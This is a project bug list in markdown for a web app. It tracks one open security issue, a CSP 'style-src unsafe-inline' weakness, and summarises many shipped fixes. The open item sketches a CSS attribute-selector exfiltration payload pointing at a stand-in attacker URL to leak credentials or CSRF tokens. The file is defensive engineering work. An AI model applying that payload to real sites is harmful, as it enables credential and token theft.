# BugList.md

1 verified bug remaining (CSP `unsafe-inline` tech debt). The 9 prior items shipped over the 2026-05-08 sweep — see CHANGELOG.md for the full per-item fix breakdown.

Severity:
- **risky** — wrong state / silent failure / abuse vector that needs a real fix
- **minor** — confirmed bug but bounded blast radius

---

## Web — security / CSP

1. **[risky] CSP `style-src 'unsafe-inline'` defeats nonce defense for data exfil**
   `web/src/middleware.js:106` (context comment lines 121-125)
   `script-src` uses `'strict-dynamic'` + nonce (strong). `style-src` keeps `'unsafe-inline'` because the profile shell's heavy inline styles caused ~20k iOS-Safari violation invocations on a strict policy. Until those migrate to classes, attribute-selector CSS exfil (`input[value^="..."] { background: url(attacker) }`) chains off any XSS gadget to leak credentials/CSRF tokens — defeating the otherwise-strong script CSP. Acknowledged technical debt; track-to-completion of the inline-style migration unblocks dropping `'unsafe-inline'`.

---

## Notes

- Earlier-shipped fixes: counter drift on `articles.view_count` / `articles.comment_count` / `articles.bookmark_count`, reading_log telemetry, admin analytics soft-delete, CommentThread N+1, Following sticky tab, iOS auto-zoom on inputs, AvatarEditor mobile grid, `receive_upvote` scoring, sticky tab strip, achievement parity on `events/batch`, mark-seen rollback, story-follow RPC rate-limit, signup_rollback IP cap, kids-end-session cap, 7-endpoint mid-priority rate-limit batch, `mark_story_seen` / `toggle_story_follow` RPC rate limits, `ai_prompt_presets_snapshot_history` RPC drop, item 13 article-summary tightening, expert UI launch-hide, all 12 easy-tier validation/null-safety fixes, the safe-batch 8 (FollowStoryButton shape, ConfirmDialog focus, HASH_SALT, bulk-approve surfacing, reject 409, iOS DM cluster + receipts cluster, kids PairingClient), the owner-judgment 5 (admin.users.recovery permission + auth-recovery route swap, approve resend-invite route + email_status metadata + 3-row backfill, support reply outranks-omitted-by-design comment, reports UNIQUE + autohide threshold setting, kid cover-image 2MB byte cap loader), the race-and-atomicity 4 (atomic `report_and_maybe_autohide` RPC + route swap, atomic `add_kid_with_seat_check` RPC + route swap, `quiz_attempts.client_attempt_id` column + partial unique index + iOS upsert with ignoreDuplicates, RLS enabled on `expert_mention_post_counters` / `expert_mention_quota_counters` / `expert_thread_chains` with admin-only SELECT policies), the 2026-05-08 final 7 (kid-profile ownership consistency + streak-freeze parity, UTC timezone fallbacks, parent session heartbeat, kids deeplink fallback hardening, cron silent-failure surfaces with Sentry quota cap, login-time deleted-account gate with iOS SIWA/Google/deep-link coverage, expert thread-chains RLS), and the 2026-05-08 launch-blockers (`/api/auth/check-username` 500-vs-401 defense-in-depth, JWKS-aware bearer verifier with `kids/pair-direct` migration to alg-aware path).
- Refuted from prior sweeps (verified not real): see git history of this file for the full list.
